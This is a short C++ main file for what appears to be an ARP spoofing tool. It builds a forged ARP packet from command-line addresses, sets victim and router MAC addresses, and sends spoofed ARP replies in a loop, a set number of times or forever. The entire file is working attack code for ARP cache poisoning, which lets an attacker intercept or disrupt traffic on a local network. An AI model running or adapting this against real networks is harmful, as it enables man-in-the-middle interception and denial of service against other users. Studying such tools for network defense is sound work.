/*
 * (c) 2018 Yating Zhou
 */
#include "arpAttack.h"
#include "FakeARPPacket.h"

int main(int argc, char** argv) 
{
    int replay = (argc > 1) ? atoi(argv[argc-1]) : 0; 
    bool forever = replay < 0;
    FakeARPPacket&& fakeARP = (argc < 5) ? 
        argc == 4 ? FakeARPPacket(argv[1], argv[2]) : FakeARPPacket() : 
        FakeARPPacket(argv[1], argv[2], argv[3]);
    uint8_t victimMAC[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
    uint8_t routerMAC[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x02 };
    fakeARP.setVictimMAC(victimMAC);
    fakeARP.setRouterMAC(routerMAC);
    while (forever || replay > 0) {
        fakeARP.sendReplyPkt();
        // prevent replay out of range
        replay -= forever ? 0 : 1;
    }
    return 0;
}